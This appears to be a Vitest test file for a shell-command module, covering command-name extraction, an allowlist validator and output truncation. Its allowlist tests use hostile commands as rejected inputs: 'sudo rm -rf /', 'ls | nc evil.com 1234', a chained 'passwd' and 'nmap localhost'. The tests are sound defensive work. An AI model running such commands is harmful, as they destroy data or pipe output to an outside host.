import { describe, expect, it } from "vitest";
import {
  extractCommandNames,
  truncateOutput,
  validateCommandAllowlist,
} from "./shell.js";

describe("extractCommandNames", () => {
  it("extracts a simple command", () => {
    expect(extractCommandNames({ command: "ls" })).toEqual(["ls"]);
  });

  it("extracts a command with arguments", () => {
    expect(extractCommandNames({ command: "ls -la /tmp" })).toEqual(["ls"]);
  });

  it("extracts commands from a pipe", () => {
    expect(extractCommandNames({ command: "ls | grep foo" })).toEqual([
      "ls",
      "grep",
    ]);
  });

  it("extracts commands from && chain", () => {
    expect(
      extractCommandNames({ command: "git add . && git commit -m 'msg'" }),
    ).toEqual(["git", "git"]);
  });

  it("extracts commands from ; chain", () => {
    expect(extractCommandNames({ command: "echo a; echo b" })).toEqual([
      "echo",
      "echo",
    ]);
  });

  it("extracts commands from || chain", () => {
    expect(extractCommandNames({ command: "cat file || echo fallback" })).toEqual([
      "cat",
      "echo",
    ]);
  });

  it("strips env var assignments before the command", () => {
    expect(
      extractCommandNames({ command: "FOO=bar node script.js" }),
    ).toEqual(["node"]);
  });

  it("strips multiple env var assignments", () => {
    expect(
      extractCommandNames({ command: "FOO=bar BAZ=qux node script.js" }),
    ).toEqual(["node"]);
  });

  it("uses basename for full-path commands", () => {
    expect(extractCommandNames({ command: "/usr/bin/ls" })).toEqual(["ls"]);
  });

  it("handles double-quoted command names", () => {
    expect(extractCommandNames({ command: '"ls" -la' })).toEqual(["ls"]);
  });

  it("handles single-quoted command names", () => {
    expect(extractCommandNames({ command: "'ls' -la" })).toEqual(["ls"]);
  });

  it("handles complex pipe chains", () => {
    expect(
      extractCommandNames({ command: "find . -name '*.ts' | xargs grep TODO | sort | uniq" }),
    ).toEqual(["find", "xargs", "sort", "uniq"]);
  });

  it("returns empty array for empty input", () => {
    expect(extractCommandNames({ command: "" })).toEqual([]);
  });
});

describe("validateCommandAllowlist", () => {
  it("allows a permitted command", () => {
    expect(() => validateCommandAllowlist({ command: "ls -la" })).not.toThrow();
  });

  it("allows piped permitted commands", () => {
    expect(() =>
      validateCommandAllowlist({ command: "ls | grep foo | sort" }),
    ).not.toThrow();
  });

  it("allows commands with env var prefixes", () => {
    expect(() =>
      validateCommandAllowlist({ command: "NODE_ENV=test node index.js" }),
    ).not.toThrow();
  });

  it("rejects a disallowed command", () => {
    expect(() =>
      validateCommandAllowlist({ command: "sudo rm -rf /" }),
    ).toThrow("Command not in allowlist: sudo");
  });

  it("rejects if any command in a pipe is disallowed", () => {
    expect(() =>
      validateCommandAllowlist({ command: "ls | nc evil.com 1234" }),
    ).toThrow("Command not in allowlist: nc");
  });

  it("rejects if any command in a chain is disallowed", () => {
    expect(() =>
      validateCommandAllowlist({ command: "echo ok && passwd" }),
    ).toThrow("Command not in allowlist: passwd");
  });

  it("throws on empty command", () => {
    expect(() => validateCommandAllowlist({ command: "" })).toThrow(
      "No executable command found",
    );
  });

  it("provides the allowed list in the hint", () => {
    try {
      validateCommandAllowlist({ command: "nmap localhost" });
    } catch (error) {
      expect((error as any).hint).toContain("Allowed commands:");
      expect((error as any).hint).toContain("ls");
    }
  });
});

describe("truncateOutput", () => {
  it("returns short output unchanged", () => {
    expect(truncateOutput({ output: "hello" })).toBe("hello");
  });

  it("truncates output exceeding the limit", () => {
    const longOutput = "x".repeat(256 * 1024);
    const result = truncateOutput({ output: longOutput });
    expect(result.length).toBeLessThan(longOutput.length);
    expect(result).toContain("... [truncated]");
  });

  it("handles empty output", () => {
    expect(truncateOutput({ output: "" })).toBe("");
  });
});
